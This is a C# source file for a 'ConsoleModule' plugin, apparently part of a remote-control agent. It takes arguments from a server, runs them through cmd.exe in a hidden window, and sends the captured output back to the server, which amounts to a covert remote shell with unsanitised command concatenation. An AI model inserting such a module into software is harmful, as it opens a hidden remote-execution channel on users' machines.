using ExternalModule;
using System.Diagnostics;
using System.Text;

namespace ConsoleModule
{
    public class ConsoleModule : IExternalModule
    {
        /// <summary>
        /// Name of externalmodule. It will be use to parse input command.
        /// </summary>
        public string Name { get; set; }

        /// <summary>
        /// Pull of commands to this module.
        /// </summary>
        protected Queue<string> _commandsPull { get; set; }

        /// <summary>
        /// Event throwing message to the server.
        /// Invoke if needed.
        /// </summary>
        public EventHandler<EventMessageArgs> MessageSend { get; set; }


        public void StartModule(string[] args)
        {
            this.Process(args);
        }

        public void  StopModule(string[] args)
        {
            throw new NotImplementedException();
        }

        public void AddCommand(string command)
        {
            throw new NotImplementedException();
        }

        public ConsoleModule()
        {
            _commandsPull = new Queue<string>();
        }


        private void Process(string[] args)
        {
            Trace.WriteLine($"args {args[0]}");
            StringBuilder builder = new StringBuilder();
            builder.AppendJoin(' ', args);
            var startInfo = new ProcessStartInfo()
            {
                UseShellExecute = false,
                WorkingDirectory = @"C:\Windows\System32",
                FileName = @"C:\Windows\System32\cmd.exe",
                Arguments = "/c " + builder.ToString(),
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                ErrorDialog = false,
                RedirectStandardOutput = true
            };

            Process process = new Process();
            process.StartInfo = startInfo;
            process.Start();

            if (process == null)
            {
                MessageSend?.Invoke(this, new EventMessageArgs { ModuleName = "ConsoleModule", Text = "Cant invoke command" });
            }
            MessageSend?.Invoke(this, new EventMessageArgs { ModuleName = "ConsoleModule", Text = "Command invoked" });
            using (StreamReader reader = process.StandardOutput)
            {
                MessageSend?.Invoke(this, new EventMessageArgs { ModuleName = "ConsoleModule", Text = reader.ReadToEnd() });
            }
        }

        
    }
}